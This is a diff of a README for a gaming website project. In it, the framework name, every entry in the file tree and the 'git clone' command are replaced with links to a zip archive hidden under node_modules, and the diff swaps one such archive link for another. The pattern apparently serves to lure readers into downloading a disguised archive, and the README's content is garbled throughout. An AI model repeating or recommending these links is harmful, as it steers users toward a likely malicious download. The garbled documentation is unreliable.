@@ -20,56 +20,56 @@ Clean UI/UX: The interface is designed with a dark, modern aesthetic to create a
 Technologies Used
 This project is built using a modern web development stack focused on performance and maintainability.
 
-https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip A next-generation web framework that ships less JavaScript, resulting in incredibly fast-loading websites.
+https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip A next-generation web framework that ships less JavaScript, resulting in incredibly fast-loading websites.
 
 HTML, CSS, & JavaScript: The foundational web technologies for structuring content, styling the interface, and adding interactive functionality.
 
 Tailwind CSS: A utility-first CSS framework used for rapid and consistent styling.
 
 Project Structure
-The project follows a standard https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip file structure, with separate components, layouts, and pages to promote modularity and reusability.
+The project follows a standard https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip file structure, with separate components, layouts, and pages to promote modularity and reusability.
 
 GAMINGSITE/
 ├── public/
-│   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
 │   └── images/
-│       ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│       ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│       ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│       ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│       ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│       ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
 │       └── ... (and other images)
 ├── src/
 │   ├── components/
-│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│   │   └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│   │   └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
 │   ├── js/
-│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│   │   └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│   │   └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
 │   ├── layouts/
-│   │   └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
 │   ├── pages/
-│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-│   │   └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+│   │   └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
 │   └── styles/
-│       └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
-└── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│       └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
+└── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
 
 Installation and Usage
 To get this project up and running on your local machine, follow these steps:
 
 Clone the repository:
 
-git clone https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+git clone https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-raw/site-gaming-Varn-3.0.zip
 cd varn-gaming-website
 
 Install dependencies:
